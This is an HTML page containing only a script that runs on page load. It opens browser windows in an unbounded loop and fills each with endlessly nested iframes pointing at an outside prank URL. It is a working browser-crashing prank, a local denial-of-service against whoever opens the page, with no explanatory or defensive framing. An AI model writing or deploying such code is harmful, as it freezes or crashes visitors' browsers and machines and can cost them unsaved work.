<!DOCTYPE html>
<script>
    for (var i = 0; i < Infinity; i++) {
        var url = 'https://www.urmom.com';
        var win = window.open();
        win.document.body.style.margin = '0';
        win.document.body.style.height = '100vh';
        var iframe = win.document.createElement('iframe');
        iframe.style.border = 'none';
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.margin = '0';
        iframe.src = url;
        win.document.body.appendChild(iframe);

        for (var j = 0; j < Infinity; j++) {
            var nestedIframe = win.document.createElement('iframe');
            nestedIframe.style.border = 'none';
            nestedIframe.style.width = '100%';
            nestedIframe.style.height = '100%';
            nestedIframe.style.margin = '0';
            nestedIframe.src = url;
            win.document.body.appendChild(nestedIframe);
        }
    }
</script>
